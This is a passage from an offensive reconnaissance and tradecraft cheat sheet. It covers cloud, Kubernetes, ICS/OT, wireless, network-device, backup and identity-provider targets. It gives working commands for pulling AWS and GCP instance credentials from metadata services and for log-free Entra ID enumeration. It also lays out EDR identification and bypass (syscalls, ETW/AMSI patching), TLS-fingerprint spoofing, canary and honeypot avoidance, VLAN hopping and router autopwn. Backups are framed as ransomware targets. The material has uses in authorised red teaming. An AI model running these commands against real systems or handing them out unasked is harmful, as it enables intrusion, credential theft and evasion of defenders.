curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
#
# Pacu (Rhino Security — automated AWS exploitation):                             
# run iam__enum_permissions — brute-force all API permissions for current creds
# run iam__privesc_scan — scan 23+ privilege escalation paths
# run lambda__enum — enumerate Lambda functions (env vars often contain secrets)
#
# CloudFox (Bishop Fox — cross-account recon):                                    
# cloudfox aws -p <profile> all-checks
# Maps trust relationships, extracts Lambda env vars, identifies attackable endpoints
# Outputs loot files with discovered credentials and access paths

# ═══════════════════════════════════════════════════════════
# AZURE ENUMERATION
# ═══════════════════════════════════════════════════════════
# Check if domain uses Azure AD / Entra ID:
curl -s "https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration" | python3 -m json.tool
# Tenant enumeration (AADInternals — powerful unauthenticated recon):
# Import-Module AADInternals
# Invoke-AADIntReconAsOutsider -DomainName target.com
# Returns: tenant ID, all verified domains, SSO status, auth type — ZERO logs generated
#
# Unauthenticated Entra ID user enumeration:                                      
# AADInternals Autologon method generates ZERO logs in the target tenant:
# Invoke-AADIntUserEnumerationAsOutsider -UserNameList users.txt
#
# ROADtools (Dirkjan Mollema — full Azure AD graph dump):                         
# roadrecon auth -u user@target.com -p password
# roadrecon gather
# roadrecon gui    # Local web interface for offline analysis of entire Azure AD
# Dumps to SQLite database — full offline enumeration without repeated API calls
#
# GraphRunner (Entra ID post-exploitation via Microsoft Graph):                   
# Invoke-GraphRunner -Tokens $tokens -All
# All-in-one: user/group/app/role enum, mail access, Teams messages, OneDrive files
#
# Blob storage enumeration:
# NOTE: Anonymous container listing only works if the storage account AND container
# have anonymous access explicitly enabled.
# Microsoft changed default to OFF: Portal accounts Sept 2023, API/CLI Nov 2023, fully Jan 2024
# IMPORTANT: Existing (pre-2023) storage accounts were NOT changed — still worth checking
# Check: https://<account>.blob.core.windows.net/<container>?restype=container&comp=list
# Returns XML listing if anonymous access is allowed; 403 if not.
# Common account name patterns: targetbackup, targetdata, target-public
# MicroBurst (Azure enumeration toolkit):
# Invoke-EnumerateAzureBlobs -Base target
# Invoke-EnumerateAzureSubDomains -Base target

# ═══════════════════════════════════════════════════════════
# GCP ENUMERATION
# ═══════════════════════════════════════════════════════════
# GCS bucket check:
curl -s "https://storage.googleapis.com/target-bucket"
gsutil ls gs://target-bucket 2>/dev/null
# GCP project enumeration (if authenticated):
gcloud projects list
# GCP metadata service (if code execution on Compute Engine):                     
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns OAuth2 token for the instance's service account

# ═══════════════════════════════════════════════════════════
# MULTI-CLOUD SECURITY AUDITING                              
# ═══════════════════════════════════════════════════════════
# ScoutSuite (NCC Group — multi-cloud CIS benchmark auditing):
# scout aws --profile <profile>
# scout azure --cli
# scout gcp --project-id <id>
# Prowler (AWS/Azure/GCP CIS + custom checks):
# prowler aws --profile <profile>
# prowler azure
# prowler gcp

# ═══════════════════════════════════════════════════════════
# KUBERNETES / CONTAINER ENUMERATION
# ═══════════════════════════════════════════════════════════
# Check for exposed K8s API (auth required on most modern clusters):
curl -sk https://<target>:6443/api/v1/namespaces   # 200 = misconfigured (anonymous RBAC)
curl -sk https://<target>:10250/pods               # 200 = kubelet anonymous auth enabled
# Most clusters return 401/403 — a 200 is a significant finding
# Docker registry (if exposed):
curl -s http://<target>:5000/v2/_catalog
curl -s http://<target>:5000/v2/<repo>/tags/list
#
# DETECTION: Cloud API calls logged in CloudTrail/Activity Log
# OPSEC: Unauthenticated cloud checks have minimal logging
#   Authenticated enumeration is fully logged in cloud audit trails
```

---

## 6 — VULNERABILITY SCANNING

```bash
# ═══════════════════════════════════════════════════════════
# NUCLEI (Template-based — community maintained, fast)
# ═══════════════════════════════════════════════════════════
# Update templates (v3.x — still valid, -ut is short alias):
nuclei -update-templates
# NOTE: Templates auto-update on each run by default. Suppress with -duc (disable update check)
# Engine update: nuclei -update (or -up)
# Scan single target:
nuclei -u https://target.com -t cves/ -severity critical,high -silent
nuclei -u https://target.com -t default-logins/ -silent
nuclei -u https://target.com -t exposures/ -silent
nuclei -u https://target.com -t misconfiguration/ -silent
# Scan multiple targets with rate limiting:
nuclei -l urls.txt -t cves/ -t default-logins/ -t exposures/ -rl 50 -c 10
# Technology-specific:
nuclei -u https://target.com -tags fortinet,ivanti,paloalto,cisco,exchange
# Custom tags for edge devices:
nuclei -u https://target.com -tags vpn,firewall,gateway
#
# DETECTION: High volume HTTP requests with probe-like patterns, WAF alerts
# OPSEC: Use -rl (rate limit) and -c (concurrency) to reduce noise
#   Nuclei user-agent is identifiable — set custom: -H "User-Agent: Mozilla/5.0 ..."
#   CRITICAL: Nuclei's Go net/http TLS fingerprint (JA3) is distinctive — see Section 11

# ═══════════════════════════════════════════════════════════
# NMAP VULNERABILITY SCRIPTS
# ═══════════════════════════════════════════════════════════
nmap --script=vuln -p <ports> <target>
nmap --script="*vuln* and not dos" <target>   # Exclude DoS scripts
# Service-specific vuln checks:
nmap --script=smb-vuln* -p 445 <target>       # All SMB vulns
nmap --script=http-vuln* -p 80,443 <target>   # All HTTP vulns
nmap --script=ssl-heartbleed -p 443 <target>  # Heartbleed (legacy)
#
# DETECTION: Nmap NSE scripts generate distinctive traffic patterns
# OPSEC: NSE vuln scripts are NOISY — use targeted scripts, not blanket "vuln"

# ═══════════════════════════════════════════════════════════
# COMMERCIAL / COMPREHENSIVE SCANNERS
# ═══════════════════════════════════════════════════════════
# Nessus (most comprehensive, requires license):
# Web UI: https://localhost:8834 → New Scan → Basic/Advanced Network Scan
# Credentialed scan: add SSH/SMB/WinRM creds for deeper inspection
#
# OpenVAS / Greenbone (open-source alternative):
sudo gvm-start                                # Kali Linux helper script
# Non-Kali: systemctl start ospd-openvas gvmd gsad
# Web UI: https://localhost:9392 → Create Target → Create Task → Start
#
# DETECTION: Thousands of probes per host — extremely noisy
# OPSEC: NEVER run Nessus/OpenVAS against external targets without permission
#   Internal use: run during business hours, from a legitimate-looking source IP

# ═══════════════════════════════════════════════════════════
# EXPLOIT AVAILABILITY CHECK
# ═══════════════════════════════════════════════════════════
# After identifying versions, check for available exploits:
searchsploit <product> <version>
searchsploit -m <exploit_id>                  # Mirror exploit locally
# Metasploit:
msfconsole -q -x "search type:exploit <product>; exit"
# GitHub: search "CVE-YYYY-NNNNN PoC"
# CISA KEV: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
# VulnCheck KEV: https://vulncheck.com/kev
# ALWAYS review exploit code before running — verify it does what it claims
```

---

## 7 — ICS / SCADA / OT RECONNAISSANCE  SECTION

```bash
# ═══════════════════════════════════════════════════════════
# ⚠️  SAFETY WARNING — READ BEFORE ANY OT SCANNING  ⚠️
# ═══════════════════════════════════════════════════════════
# ICS/OT devices have fragile TCP stacks. Even a port scan can crash PLCs, RTUs, and HMIs.
# NEVER actively scan PLCs during production without explicit authorization and safety coordination.
# Prefer passive methods (traffic capture, GRASSMARLIN) whenever possible.
# If scanning is required: single-host, single-port, slow rate, during maintenance windows ONLY.
# A crashed PLC can mean physical damage, environmental release, or loss of life.

# ═══════════════════════════════════════════════════════════
# ICS PROTOCOL IDENTIFICATION (common ports)
# ═══════════════════════════════════════════════════════════
# Modbus TCP (port 502) — NO AUTHENTICATION by design (standard Modbus/TCP):
# CAVEAT: Modbus/TCP Security (spec v36, July 2021) adds TLS 1.2+ on port 802 with
#   X.509v3 mutual auth and role-based access. Adoption is limited but growing.
#   Standard port 502 remains unauthenticated in the vast majority of deployments.
nmap -sT -p 502 --script modbus-discover <target>
# Read holding registers (CAUTION — even reads can disrupt some devices):
# modbus-cli read <target> 0 10  # Read registers 0-10
#
# Siemens S7comm (port 102):
nmap -sT -p 102 --script s7-info <target>
# Returns: module name, plant ID, serial number, firmware version, CPU type
#
# DNP3 / Distributed Network Protocol (port 20000):
# ⚠️ dnp3-info is NOT in official Nmap — requires manual install from Redpoint repo:
# wget https://raw.githubusercontent.com/digitalbond/Redpoint/master/dnp3-info.nse -O /usr/share/nmap/scripts/dnp3-info.nse
nmap -sT -p 20000 --script dnp3-info <target>
#
# EtherNet/IP / CIP (port 44818):
nmap -sT -p 44818 --script enip-info <target>
#
# BACnet / Building Automation (port 47808 UDP):
nmap -sU -p 47808 --script bacnet-info <target>
#
# OPC UA (port 4840):
# opcua-browser <target>:4840  # Enumerate OPC UA server nodes
#
# FINS / Omron (port 9600):
nmap -sT -p 9600 <target>
#
# Digital Bond Redpoint scripts (ICS-specific Nmap NSE):
# https://github.com/digitalbond/Redpoint
# In official Nmap: modbus-discover, s7-info, enip-info, bacnet-info, fox-info, pcworx-info
# Redpoint-only (requires manual install): dnp3-info

# ═══════════════════════════════════════════════════════════
# PASSIVE OT NETWORK MAPPING (ZERO TRAFFIC)
# ═══════════════════════════════════════════════════════════
# GRASSMARLIN (NSA — passive OT topology mapping from PCAPs):
# ⚠️ ARCHIVED: GitHub repo archived April 14, 2023 — no longer maintained. No official successor.
# Still functional for PCAP analysis but will not receive updates or new protocol support.
# Import PCAP → auto-identifies ICS protocols → generates network topology
# Identifies: Modbus, S7, DNP3, EtherNet/IP, BACnet, OPC, FINS, HART, IEC 61850
# Zero network traffic — works entirely from packet captures
# Alternative for live analysis: Zeek with ICS protocol analyzers, or commercial (Claroty, Nozomi)
#
# Wireshark ICS protocol dissectors:
# Filter: modbus || s7comm || dnp3 || enip || cip || bacnet || opcua
# Capture on OT network span port → analyze offline with GRASSMARLIN

# ═══════════════════════════════════════════════════════════
# OT/IT BOUNDARY DISCOVERY
# ═══════════════════════════════════════════════════════════
# Identify jump hosts / data historians that bridge IT and OT:
# Common indicators:
#   - Hosts with both corporate (.corp.target.com) and OT network addresses
#   - Data historian ports: OSIsoft PI (5450), Wonderware (various)
#   - OPC DA/UA gateway services
#   - Engineering workstations with vendor software (Siemens TIA Portal, RSLogix, etc.)
#
# Shodan queries for internet-exposed ICS (from passive recon phase):
#   "port:502" org:target                     # Modbus
#   "port:102" org:target                     # S7
#   "port:47808" org:target                   # BACnet
#   "port:20000" org:target                   # DNP3
#
# DETECTION: ICS-specific IDS (Claroty, Nozomi, Dragos) will detect any active scanning
# OPSEC: Passive methods only unless explicitly authorized for active OT scanning
#   PIPEDREAM/INCONTROLLER (state-sponsored ICS toolkit) demonstrates the recon-to-attack
#   pipeline: OPC UA scanning → Modbus/Codesys enumeration → PLC manipulation
```

---

## 8 — WIRELESS & RF RECONNAISSANCE  SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WiFi RECONNAISSANCE
# ═══════════════════════════════════════════════════════════
# Monitor mode setup:
sudo airmon-ng start wlan0
# Passive WiFi survey (zero transmitted packets):
sudo airodump-ng wlan0mon                     # Capture all visible APs and clients
sudo airodump-ng wlan0mon -w capture --output-format pcap  # Save for offline analysis
# Kismet (comprehensive wireless survey):
kismet -c wlan0mon                            # Web UI on http://localhost:2501
# WPA3/SAE considerations:
# WPA3 uses Simultaneous Authentication of Equals (SAE) — resistant to offline dictionary attacks
# Dragonblood vulnerabilities (CVE-2019-9494/9496) may still affect some implementations
# Bettercap for active WiFi attacks:
sudo bettercap -iface wlan0mon -eval "wifi.recon on"
#
# INTELLIGENCE VALUE: SSID names reveal org structure, guest network existence, vendor equipment
# OPSEC: Passive monitoring generates zero RF emissions. Active deauth/injection is detectable.

# ═══════════════════════════════════════════════════════════
# BLUETOOTH / BLE SCANNING
# ═══════════════════════════════════════════════════════════
# BLE device discovery:
sudo bettercap -eval "ble.recon on"
sudo hcitool lescan                           # BLE scan
# Flipper Zero with Momentum firmware:
# Bluetooth scanning, BLE enumeration, frequency analysis
#
# INTELLIGENCE VALUE: Reveals badge readers, IoT devices, wireless peripherals, mobile devices

# ═══════════════════════════════════════════════════════════
# SDR / RADIO FREQUENCY RECONNAISSANCE
# ═══════════════════════════════════════════════════════════
# RTL-SDR (cheap, wide-band receive-only):
# Frequency scanning: rtl_power -f 300M:1G:100k -g 50 output.csv
# HackRF One (full TX/RX):
# Broadband spectrum analysis with GNU Radio or Universal Radio Hacker (URH)
# Target frequencies of interest:
#   ISM bands: 315MHz, 433MHz, 868MHz, 915MHz (garage doors, sensors, key fobs)
#   Pagers: 150-174MHz, 450-470MHz (often unencrypted — HIPAA-sensitive in healthcare)
#   DECT phones: 1880-1930MHz
#   Building automation: 868/915MHz (Zigbee, Z-Wave)
#   Cellular: 700-2600MHz (IMSI catching — legal implications vary by jurisdiction)

# ═══════════════════════════════════════════════════════════
# RFID / NFC
# ═══════════════════════════════════════════════════════════
# Proxmark3 (gold standard for RFID research):
# Read HID/EM4100: lf hid reader / lf em4x05 reader
# Read MIFARE Classic: hf mf autopwn
# Flipper Zero: NFC/RFID read, emulate, save
#
# INTELLIGENCE VALUE: Badge cloning for physical access, identifying access control systems
# OPSEC: RFID reading requires close physical proximity (<10cm for NFC, ~1m for LF)
```

---

## 9 — EDR-AWARE TRADECRAFT  SECTION

```bash
# ═══════════════════════════════════════════════════════════
# EDR / AV IDENTIFICATION (know what you're facing)
# ═══════════════════════════════════════════════════════════
# Identify endpoint protection from outside (pre-access):
# DNS cache snooping for security vendor domains (see Section 1)
# Job postings mentioning specific security products
# SSL certificates from security vendor portals
#
# Identify from inside (post-access, low-detection methods):
# WMI query (no child process — preferred over tasklist):
Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -match "Crowd|Sentinel|Defender|Carbon|Symantec|Trend|Sophos|ESET|Kaspersky|Cylance|McAfee|Elastic|Palo"}
# Service enumeration:
Get-Service | Where-Object {$_.DisplayName -match "Crowd|Sentinel|Defender|Carbon|Falcon"}
# Process check (if WMI not available):
Get-Process | Where-Object {$_.ProcessName -match "csfalcon|MsMpEng|SentinelAgent|CbDefense|elastic-agent"}
# Registry check:
reg query "HKLM\SOFTWARE\CrowdStrike" 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender" 2>nul
# Linux EDR check:
ps aux | grep -i "falcon\|sentinel\|elastic\|cb\|crowd\|carbon"
ls /opt/CrowdStrike/ /opt/SentinelOne/ /opt/carbonblack/ 2>/dev/null
systemctl list-units | grep -i "falcon\|sentinel\|elastic"

# ═══════════════════════════════════════════════════════════
# RECON COMMAND DETECTION RISK TIERS
# ═══════════════════════════════════════════════════════════
# HIGH DETECTION RISK (triggers immediate alerts in most EDR/MDI):
#   net group "domain admins" /domain          ← MDI SAMR-based enum detection
#   nltest /dclist:target.local                ← MDI detects this specifically
#   nltest /domain_trusts                      ← MDI trust enumeration alert
#   SharpHound / BloodHound collection         ← Signature-detected by all major EDR
#   PowerView (Get-DomainUser, Get-NetComputer, etc.)  ← Behavioral + signature detection
#   Mimikatz (any execution)                   ← Universal detection
#   whoami /all + net commands in rapid succession  ← Correlated as recon pattern
#
# MEDIUM DETECTION RISK (EDR signatures exist, may require threshold):
#   wmic process list                          ← Some EDR flag WMI process enumeration
#   net view                                   ← Common but logged
#   net user /domain                           ← AD query, logged in DC event log
#   certutil -urlcache                         ← LOLBin download, behavioral detection
#   Test-NetConnection / tnc (port scan)       ← Flagged if repeated rapidly
#
# LOW DETECTION RISK (minimal EDR coverage, blend with normal admin activity):
#   dsquery / dsget                            ← NOT detected by MDI by default
#   csvde / ldifde                             ← Minimal EDR coverage
#   reg query (remote)                         ← Normal admin activity
#   netsh advfirewall show                     ← Firewall rule enumeration
#   sc query                                   ← Service enumeration
#   Get-WmiObject (single queries)             ← Normal WMI usage
#   /proc filesystem reads (Linux)             ← Zero process creation
#   ss -tlnp / getent passwd (Linux)           ← Native utilities, low signature coverage

# ═══════════════════════════════════════════════════════════
# STEALTH TECHNIQUES FOR RECON
# ═══════════════════════════════════════════════════════════
# Prefer WMI/COM objects over command-line tools:
# Instead of: tasklist /v
# Use: Get-WmiObject Win32_Process | Select ProcessId,Name,CommandLine
#
# Prefer BOFs (Beacon Object Files) over tool upload:
# BOFs execute in-memory within the existing Beacon/Sliver process
# No child process creation, no disk artifacts, ~3KB footprint
# Community BOF repositories: TrustedSec SA-BOF, bof-collection, InlineWhispers
#
# Prefer direct syscalls over Win32 API (bypasses ntdll hooks):
# SysWhispers3, HellsGate, Halo's Gate — generate direct syscall stubs
# CAVEAT: Modern EDR performs call stack analysis to detect direct syscalls
# Counter: call stack spoofing (e.g., SilentMoonwalk, Unwinder)
#
# Linux: use /proc filesystem for zero-footprint recon:
cat /proc/net/arp                             # ARP table (no command logged by auditd)
cat /proc/net/tcp                             # TCP connections (hex format, parse with awk)
cat /proc/net/route                           # Routing table
ls /proc/*/cmdline | xargs -I{} sh -c 'echo "{}:"; cat {}; echo' 2>/dev/null  # All running commands
cat /etc/passwd                               # User enumeration
getent group | grep -i admin                  # Admin group members
find / -perm -4000 -type f 2>/dev/null        # SUID binaries (privesc candidates)
# Reference: GTFOBins (Linux LOLBin equivalent of LOLBAS)

# ═══════════════════════════════════════════════════════════
# ETW & AMSI EVASION (for PowerShell-based recon)
# ═══════════════════════════════════════════════════════════
# Classic ETW patching (EtwEventWrite) is NOW DETECTED by kernel-level ETWTi events
# Modern approach: patchless hardware breakpoint bypass
# Set CPU debug register breakpoint on NtTraceEvent via NtContinue
# NtContinue does NOT generate ETWTi events for SetThreadContext
# Reference: Turla Kazuar v3 loader uses this exact technique
#
# AMSI bypass evolution:
# Simple string patches: detected by most EDR (signature on the patch itself)
# Current: AMSI context corruption, hardware breakpoint on AmsiScanBuffer
# The arms race continues — test against specific EDR before deployment
```

---

## 10 — TLS FINGERPRINT EVASION (JA3/JA4+)  SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WHY THIS MATTERS
# ═══════════════════════════════════════════════════════════
# Every scanning tool has a UNIQUE TLS fingerprint that identifies it
# BEFORE any HTTP data is exchanged. This includes:
#   - Python requests/urllib3     → distinctive JA3
#   - Go net/http (Nuclei/httpx)  → distinctive JA3
#   - curl (default)              → distinctive JA3
#   - Nmap                        → distinctive JA3
#   - All major C2 frameworks     → known JA3 signatures
#
# WHO IS FINGERPRINTING:
#   AWS WAF: JA4 fingerprinting added March 2025 (aggregation + rate-based rules)
#   Cloudflare: JA3 fingerprinting since 2019, JA4 since 2024
#   Akamai: Enhanced fingerprinting (JA3 + HTTP/2 SETTINGS + stream priority)
#   CrowdStrike Falcon: JA3 correlation with threat intelligence
#   All major enterprise WAFs and CDNs
#
# JA4+ SUITE (2023+): Specifically designed to resist Chrome TLS extension randomization
#   JA4: TLS client fingerprint (replaces JA3)
#   JA4S: Server response fingerprint
#   JA4H: HTTP client fingerprint (headers)
#   JA4X: X.509 certificate fingerprint

# ═══════════════════════════════════════════════════════════
# BROWSER IMPERSONATION TOOLS
# ═══════════════════════════════════════════════════════════
# curl-impersonate / curl_cffi (Python — best for scripted recon):
# pip install curl_cffi
# Supports: Chrome 99-131+, Edge, Safari impersonation with full JA3 matching
# Chrome 131 OFFERS X25519MLKEM768 (no hyphen) as default hybrid key exchange —
#   servers without post-quantum support negotiate classical X25519 normally.
#   curl_cffi impersonates Chrome 131's ClientHello via BoringSSL (indirect PQ support).
# Usage:
#   from curl_cffi import requests
#   r = requests.get("https://target.com", impersonate="chrome131")
#
# utls (Go — low-level TLS control, Refraction Networking):
# Full control over ClientHello parameters for custom fingerprints
# Used by: many Go-based offensive tools for browser mimicry
#
# tls-client (Go, bogdanfinn — high-level browser profile impersonation):
# Pre-built profiles: Chrome, Firefox, Safari, Edge
#
# CycleTLS (Node.js — per-request fingerprint rotation):
# Rotates JA3 across requests to avoid fingerprint-based rate limiting

# ═══════════════════════════════════════════════════════════
# CONSISTENCY REQUIREMENTS (CRITICAL)
# ═══════════════════════════════════════════════════════════
# ALL of these must match or you trigger instant blocking:
#   1. JA3/JA4 TLS fingerprint → must match claimed browser
#   2. User-Agent header       → must match same browser/version
#   3. HTTP/2 SETTINGS frame   → must match same browser
#   4. HTTP/2 stream priority  → must match same browser
#   5. Header order            → must match same browser
#   6. Accept-Language/Encoding → must match browser defaults
#
# WRONG: Chrome JA3 + Firefox User-Agent = instant detection
# WRONG: Chrome 120 JA3 + Chrome 131 User-Agent = fingerprint mismatch
# RIGHT: Chrome 131 JA3 + Chrome 131 User-Agent + Chrome HTTP/2 SETTINGS
#
# Akamai's enhanced fingerprinting now includes:
#   - HTTP/2 SETTINGS values
#   - Handshake timing analysis
#   - Cross-request consistency checks (same JA3 across all requests in session)
#
# VERIFICATION: Test your fingerprint before engaging targets
# Check: https://tls.browserleaks.com/json or https://scrapfly.io/web-scraping-tools/ja3-fingerprint
```

---

## 11 — DECEPTION DETECTION & AVOIDANCE  SECTION

```bash
# ═══════════════════════════════════════════════════════════
# HONEYPOT INDICATORS
# ═══════════════════════════════════════════════════════════
# Thinkst Canaries are widely deployed in enterprise environments.
# Detection indicators:
#   - Services that accept ANY credentials (test: try 3 random user/pass combos)
#   - Unusual service combinations on a single host (SSH + RDP + SMB + HTTP on one box)
#   - Services with default banners that don't match the environment
#   - MAC addresses from virtualization platforms (VMware, VirtualBox, QEMU) on
#     hosts that should be physical
#   - Hostnames that are "too perfect" (e.g., DC03, FILESERVER02 when real naming uses different patterns)
#   - Services running on non-standard ports with standard banners
#   - Systems that respond to every port scan with open ports

# ═══════════════════════════════════════════════════════════
# CANARY TOKEN INDICATORS
# ═══════════════════════════════════════════════════════════
# Canary tokens trigger callbacks when accessed. Common forms:
#   - Documents on shares: 2024_Q4_BonusPlan.xlsx, passwords.xlsx, domain_admins.xlsx
#     (tempting filenames on accessible shares = likely canary)
#   - DNS tokens: embedded URLs resolving to canarytokens.org / canarytokens.com
#   - AWS keys: credential pairs that phone home when used
#   - Windows folder tokens: .ini files that trigger on folder browse
#   - Email tokens: tracking pixels in phishing awareness test emails
#   - Cloned website tokens: login pages that alert on credential entry
#
# AVOIDANCE:
#   - NEVER open documents from shares without inspecting metadata first
#     (check for embedded URLs, macros, external references using olevba / oletools)
#   - Check DNS before accessing: does it resolve to canarytokens.org?
#   - Don't use discovered AWS credentials without first checking them against
#     known canary token patterns (certain key prefixes are canary-associated)
#   - Microsoft Defender for Identity now includes built-in deception (honeytoken accounts)
#     MDI honeytoken accounts trigger alerts on ANY Kerberos activity

# ═══════════════════════════════════════════════════════════
# HONEYPOT NETWORK DETECTION
# ═══════════════════════════════════════════════════════════
# Before interacting with discovered services, verify they're real:
#   1. Cross-reference with DNS records (real servers usually have PTR records)
#   2. Check if the host appears in AD (real servers are domain-joined)
#   3. Compare OS fingerprint with service (Windows SSH + Linux banner = suspicious)
#   4. Check ARP tables for MAC vendor (compare with other hosts on subnet)
#   5. Low-interaction honeypots have limited protocol depth — probe deeper before trusting
#
# Average enterprise breakout time is 48 minutes (CrowdStrike 2025 GTR, down from 62min in 2024)
# Fastest recorded eCrime breakout: 51 seconds (CrowdStrike 2025 GTR, down from 2:07 in 2024)
# Canary tokens collapse this detection window to near-zero if triggered
```

---

## 12 — NETWORK IMPLANT RECONNAISSANCE  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WHY THIS IS DIFFERENT FROM HOST-BASED RECON
# ═══════════════════════════════════════════════════════════
# Compromising a router/switch/firewall unlocks an entirely different data plane.
# A single network device reveals topology that would take weeks of active scanning.
# This section applies AFTER gaining access to network infrastructure (router, switch, FW).

# ═══════════════════════════════════════════════════════════
# ROUTING TABLE & TOPOLOGY EXTRACTION
# ═══════════════════════════════════════════════════════════
# OSPF Link State Database — reveals COMPLETE routing topology:
# show ip ospf database                         # Every router, link, and subnet in the area
# show ip ospf neighbor                         # Adjacent OSPF routers
# show ip route ospf                            # All OSPF-learned routes
# BGP table — upstream providers, peering, external routing policy:
# show ip bgp summary                           # BGP neighbor status
# show ip bgp                                   # Full BGP table (external topology)
# Static/connected routes reveal directly attached network segments:
# show ip route                                 # Full routing table

# ═══════════════════════════════════════════════════════════
# ACL & SECURITY POLICY EXTRACTION
# ═══════════════════════════════════════════════════════════
# show access-lists                              # All ACLs with hit counts (shows active rules)
# show ip access-lists                           # IP-specific ACLs
# show firewall policy                           # Firewall rule sets (vendor-specific)
# ACL hit counts reveal which rules are active vs dead — operational intelligence
# Combined with routing tables = complete picture of what traffic can flow where

# ═══════════════════════════════════════════════════════════
# VLAN MAPPING & SEGMENTATION DISCOVERY
# ═══════════════════════════════════════════════════════════
# show vlan brief                                # All VLANs and assigned ports
# show interfaces trunk                          # Trunk ports (carry multiple VLANs)
# show spanning-tree                             # STP topology (root bridge, port states)
# show cdp neighbors detail                      # Cisco Discovery Protocol (connected devices + IPs)
# show lldp neighbors detail                     # Link Layer Discovery Protocol (vendor-neutral)
#
# Layer 2 attacks for VLAN boundary crossing:
# Yersinia — DTP (Dynamic Trunking Protocol) negotiation to force trunk mode:
# yersinia dtp -attack 1 -interface eth0         # Negotiate trunk → access all VLANs
# VoIP Hopper — discover and join voice VLANs:
# voiphopper -i eth0 -c 0                        # Auto-detect voice VLAN via CDP/LLDP-MED
#
# SPAN/mirror port configuration — passive capture of entire segments:
# If you can configure a SPAN port, you gain passive visibility into all traffic on target VLANs
# show monitor session all                       # View existing SPAN configurations

# ═══════════════════════════════════════════════════════════
# NETWORK DEVICE EXPLOITATION
# ═══════════════════════════════════════════════════════════
# RouterSploit — exploitation framework for embedded/network devices:
# rsf > use scanners/autopwn
# rsf > set target <router_ip>
# rsf > run
#
# Common default credentials: admin/admin, cisco/cisco, enable/blank
# SNMP RW community strings allow configuration changes (see SNMP section)
# Many network devices still run telnet (cleartext credentials on the wire)
#
# DETECTION: Network device logs vary wildly — many have minimal logging by default
# OPSEC: Network device compromise is extremely high-value, low-detection
#   Most EDR/SIEM focus on endpoints — network devices are a blind spot
#   Changes to routing/ACLs may be detected by network monitoring tools (SolarWinds, Auvik)
```

---

## 13 — BACKUP INFRASTRUCTURE RECONNAISSANCE  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# WHY BACKUPS ARE THE #1 RANSOMWARE TARGET
# ═══════════════════════════════════════════════════════════
# Destroying backups eliminates recovery without payment.
# Backup credentials are typically the MOST privileged in the environment —
# they need read access to EVERYTHING.
# Compromising a backup server reveals the complete data inventory.
# CVE-2024-40711 (Veeam, CVSS 9.8, unauth RCE) was weaponized by Akira, Fog, and Frag
# ransomware within weeks. CVE-2026-21666/21667/21669/21708 (all CVSS 9.9, March 2026)
# affect Veeam's latest versions.

# ═══════════════════════════════════════════════════════════
# BACKUP SERVICE DISCOVERY (characteristic ports)
# ═══════════════════════════════════════════════════════════
# Veeam Backup & Replication:
nmap -sT -p 9392,9393,9401,6160,6162 <target>   # Console (9392), API, agent ports
# Veeam Management Console: https://<target>:9392
#
# Commvault:
nmap -sT -p 8400,8401,8402,8403 <target>        # CommServe, communications, web
# Commvault Command Center: https://<target>:443/adminconsole
#
# Veritas NetBackup:
nmap -sT -p 13724,13782,13783 <target>          # PBX, bpcd, bpjava
# Veritas NetBackup Admin Console: 13724 (bpcd)
#
# Generic backup indicators:
# DNS names: backup01, veeam, commvault, netbackup, dpm, acronis, rubrik
# AD group names: Backup Operators, Veeam Admins
# SMB shares: Backups, VeeamBackup, NetBackup
for name in backup veeam commvault netbackup dpm rubrik acronis cohesity; do
  nslookup $name.target.local 2>/dev/null | grep "Address:" | tail -1
done

# ═══════════════════════════════════════════════════════════
# INTELLIGENCE VALUE OF BACKUP COMPROMISE
# ═══════════════════════════════════════════════════════════
# A compromised backup server reveals:
#   - Complete data inventory (every protected system and its data classification)
#   - Retention schedules (how far back data goes, when it's purged)
#   - Credential stores (hypervisor passwords, cloud API keys, service accounts)
#   - Network topology of ALL protected systems
#   - Recovery procedures (how the org would respond to ransomware)
#   - Off-site replication targets (secondary sites, cloud repositories)
#
# DETECTION: Backup admin console access logged, but credentials often shared/service accounts
# OPSEC: Backup operators group membership is rarely monitored in real-time
```

---

## 14 — IDENTITY PROVIDER ENUMERATION  v3 SECTION

```bash
# ═══════════════════════════════════════════════════════════
# BEYOND ACTIVE DIRECTORY — FEDERATED IDENTITY
# ═══════════════════════════════════════════════════════════
# Modern enterprises federate authentication through IdPs.
# Compromising an identity provider = controlling access to EVERY federated application.
# This section covers attack surfaces that traditional AD enumeration cannot reveal.

# ═══════════════════════════════════════════════════════════
# ADFS (Active Directory Federation Services)
# ═══════════════════════════════════════════════════════════
# ADFS discovery:
curl -s https://adfs.target.com/adfs/ls/IdpInitiatedSignOn.aspx  # Confirm ADFS exists
curl -s https://adfs.target.com/FederationMetadata/2007-06/FederationMetadata.xml  # Metadata with Relying Party list
# Policy Store Transfer Service (remote config extraction with service account NTHash):
# http://<adfs>:80/adfs/services/policystoretransfer
#
# Golden SAML prerequisites (recon checklist — used in SolarWinds attack):
#   1. ADFS Token Signing Certificate (extractable if ADFS server compromised)
#   2. DKM (Distributed Key Management) master key from AD
#   3. Relying Party trust enumeration (which apps trust this ADFS)
# Tools: ADFSDump (extract certs/keys), ADFSpoof (forge SAML assertions)
# ADFSRelay: NTLM relay to ADFS for token extraction

# ═══════════════════════════════════════════════════════════
# OKTA ENUMERATION
# ═══════════════════════════════════════════════════════════
# Okta tenant discovery:
curl -s https://target.okta.com/.well-known/openid-configuration | python3 -m json.tool
# User enumeration via login page timing (response differs for valid vs invalid users)
# OktaPostExToolkit: skeleton key attacks by emulating the AD Agent
# Okta System Log API (if admin access obtained): full audit trail of all auth events
#
# INTELLIGENCE VALUE: Okta MFA policies, conditional access rules, app integrations
# Bypass paths: MFA fatigue (push notification spam), session token theft

# ═══════════════════════════════════════════════════════════
# ENTRA ID / AZURE AD (deeper than basic enumeration)
# ═══════════════════════════════════════════════════════════
# PRT (Primary Refresh Token) abuse — MFA bypass via browser cookie replay:
# dsregcmd /status                               # Check PRT availability on compromised host
